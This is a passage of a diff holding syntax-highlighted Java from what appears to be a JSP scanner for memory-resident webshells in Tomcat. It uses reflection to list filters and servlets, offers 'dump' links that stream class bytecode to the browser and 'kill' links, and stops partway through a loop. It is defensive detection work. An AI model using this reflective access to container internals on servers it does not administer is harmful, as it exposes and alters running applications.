+                &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;addHeader&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;content-Type&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;application/octet-stream&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;forName&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;className&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;getSimpleName&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;.class&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+
+                &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;agent&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getHeader&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;User-Agent&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;agent&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;toLowerCase&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;indexOf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;chrome&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;addHeader&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;content-Disposition&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;attachment;filename=&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getBytes&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;ISO8859-1&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;addHeader&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;content-Disposition&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;attachment;filename=&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;URLEncoder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;encode&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="n"&gt;ServletOutputStream&lt;/span&gt; &lt;span class="n"&gt;outDumper&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getOutputStream&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                &lt;span class="n"&gt;outDumper&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;classBytes&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;classBytes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;length&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;outDumper&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;close&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="c1"&gt;// Scan filter
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;                &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;h4&amp;gt;Filter scan result&amp;lt;/h4&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;table border=\&amp;#34;1\&amp;#34; cellspacing=\&amp;#34;0\&amp;#34; width=\&amp;#34;95%\&amp;#34; style=\&amp;#34;table-layout:fixed;word-break:break-all;background:#f2f2f2\&amp;#34;&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;    &amp;lt;thead&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;5%\&amp;#34;&amp;gt;ID&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;10%\&amp;#34;&amp;gt;Filter name&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;10%\&amp;#34;&amp;gt;Patern&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;20%\&amp;#34;&amp;gt;Filter class&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;20%\&amp;#34;&amp;gt;Filter classLoader&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;25%\&amp;#34;&amp;gt;Filter class file path&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;5%\&amp;#34;&amp;gt;dump class&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;5%\&amp;#34;&amp;gt;kill&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;    &amp;lt;/thead&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;    &amp;lt;tbody&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+
+                &lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;filterConfigs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getFilterConfig&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;filterMaps1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getFilterMaps&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;filterMaps1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;length&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;tr&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;fm&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filterMaps1&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;];&lt;/span&gt;
+                    &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;appFilterConfig&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filterConfigs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getFilterName&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fm&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
+                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;appFilterConfig&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                        &lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt;
+                    &lt;span class="n"&gt;Field&lt;/span&gt; &lt;span class="n"&gt;_filter&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;appFilterConfig&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getDeclaredField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;filter&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;_filter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAccessible&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;filter&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;_filter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;appFilterConfig&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;filterClassName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                    &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;filterClassLoaderName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getClassLoader&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                    &lt;span class="c1"&gt;// ID Filtername 匹配路径 className classLoader 是否存在file dump kill
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;                    &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;format&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;td style=\&amp;#34;text-align:center\&amp;#34;&amp;gt;%d&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;%s&amp;lt;/td&amp;gt;&amp;lt;td style=\&amp;#34;text-align:center\&amp;#34;&amp;gt;&amp;lt;a href=\&amp;#34;?action=dump&amp;amp;className=%s\&amp;#34;&amp;gt;dump&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td style=\&amp;#34;text-align:center\&amp;#34;&amp;gt;&amp;lt;a href=\&amp;#34;?action=kill&amp;amp;filterName=%s\&amp;#34;&amp;gt;kill&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;#34;&lt;/span&gt;
+                            &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt;
+                            &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;getFilterName&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fm&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+                            &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arrayToString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getURLPatterns&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fm&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
+                            &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;filterClassName&lt;/span&gt;
+                            &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;filterClassLoaderName&lt;/span&gt;
+                            &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;classFileIsExists&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;())&lt;/span&gt;
+                            &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;filterClassName&lt;/span&gt;
+                            &lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;getFilterName&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fm&lt;/span&gt;&lt;span class="o"&gt;)));&lt;/span&gt;
+                    &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;/tr&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;/tbody&amp;gt;&amp;lt;/table&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+
+                &lt;span class="c1"&gt;// Scan servlet
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;                &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;h4&amp;gt;Servlet scan result&amp;lt;/h4&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;write&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&amp;lt;table border=\&amp;#34;1\&amp;#34; cellspacing=\&amp;#34;0\&amp;#34; width=\&amp;#34;95%\&amp;#34; style=\&amp;#34;table-layout:fixed;word-break:break-all;background:#f2f2f2\&amp;#34;&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;    &amp;lt;thead&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;5%\&amp;#34;&amp;gt;ID&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;10%\&amp;#34;&amp;gt;Servlet name&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;10%\&amp;#34;&amp;gt;Patern&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;20%\&amp;#34;&amp;gt;Servlet class&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;20%\&amp;#34;&amp;gt;Servlet classLoader&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;25%\&amp;#34;&amp;gt;Servlet class file path&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;5%\&amp;#34;&amp;gt;dump class&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;        &amp;lt;th width=\&amp;#34;5%\&amp;#34;&amp;gt;kill&amp;lt;/th&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;    &amp;lt;/thead&amp;gt;\n&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
+                        &lt;span class="s"&gt;&amp;#34;    &amp;lt;tbody&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+
+                &lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;children&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getChildren&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;Map&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;servletMappings&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getServletMaps&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+
+                &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;servletId&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Map&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Entry&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;map&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;servletMappings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;entrySet&lt;/span&gt;&lt;span class="o"&gt;())&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;servletMapPath&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;map&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getKey&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                    &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;servletName1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;map&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getValue&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                    &lt;span class="n"&gt;StandardWrapper&lt;/span&gt; &lt;span class="n"&gt;wrapper&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;StandardWrapper&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;children&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;servletName1&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+
+                    &lt;span class="n"&gt;Class&lt;/span&gt; &lt;span class="n"&gt;servletClass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                    &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                        &lt;span class="n"&gt;servletClass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;forName&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;wrapper&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getServletClass&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                        &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;servlet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;wrapper&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getServlet&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;servlet&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                            &lt;span class="n"&gt;servletClass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;servlet&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                        &lt;span class="o"&gt;}&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt;
+                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;servletClass&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
